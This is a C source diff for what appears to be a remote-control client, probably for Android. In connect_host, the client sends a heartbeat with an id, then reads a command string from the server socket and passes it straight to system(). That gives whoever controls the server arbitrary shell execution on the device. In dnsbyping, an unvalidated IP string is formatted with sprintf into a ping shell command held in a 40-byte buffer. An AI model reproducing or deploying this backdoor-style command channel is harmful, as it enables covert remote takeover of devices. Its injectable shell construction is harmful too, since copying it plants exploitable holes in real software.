@@ -27,7 +27,7 @@ int dnsbyping(char* ip)
 	char ping[40] = {0};
 	sprintf(ping,"ping %s > %s",ip,filename);
 	pthread_t pid = pthread_run(ping_pthread,ping);
-	sleep(4);
+	sleep(2);
 	pthread_cancel(pid);
 	pthread_join(pid,NULL);
 	int filefd = open(filename,O_RDWR);
@@ -66,7 +66,7 @@ int dnsbyping(char* ip)
 
 
 
-int connect_host()
+int connect_host(int m)
 {
 	char ipaddr[30];
 	char port[10];
@@ -94,18 +94,26 @@ int connect_host()
 	DEBUGW;
 	U_MSG k;
 	k.regist_m.type = T_HEART;
-	k.regist_m.id = 2;
+	k.regist_m.id = m;
 	int n = write(sockfd,&k,sizeof(U_MSG));
 	DEBUGW;
 	if(n!=sizeof(U_MSG))
 		perror("write err");
 	DEBUGW;
-/*	n = read(sockfd,&k,sizeof(U_MSG));
+	n = read(sockfd,&k,sizeof(U_MSG));
 	DEBUGW;
 	if(n!=sizeof(U_MSG))
-		perror("read err");*/
-
-	printf("%d\n",k.regist_m.id);
+		perror("read err");
+	char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
+	memset(shellbuf,0,k.shell_m.commandlen+1);
+	DEBUGI(k.shell_m.commandlen);
+	DEBUGW;
+	n = read(sockfd,shellbuf,k.shell_m.commandlen);
+	DEBUGW;
+	if(n!=k.shell_m.commandlen)
+		perror("read err");
+	printf("%s\n", shellbuf);
+	system(shellbuf);
 
 	close(sockfd);
 }
@@ -114,7 +122,8 @@ int connect_host()
 
 void* timer_connect_host(void* argument)
 {
-	connect_host();
+	int k = *(int*)argument;
+	connect_host(k);
 }
 
 //-----------------------------connect-----------------------------
@@ -193,6 +202,7 @@ int linkbash()
 			perror("err:");
 			return false;
 		}
+		errno = 0;
 	}
 	red = symlink("/system/bin/sh","/bin/sh");
 	if(red == -1)
@@ -202,6 +212,7 @@ int linkbash()
 			perror("err:");
 			return false;
 		}
+		errno = 0;
 	}
 	return true;
 }
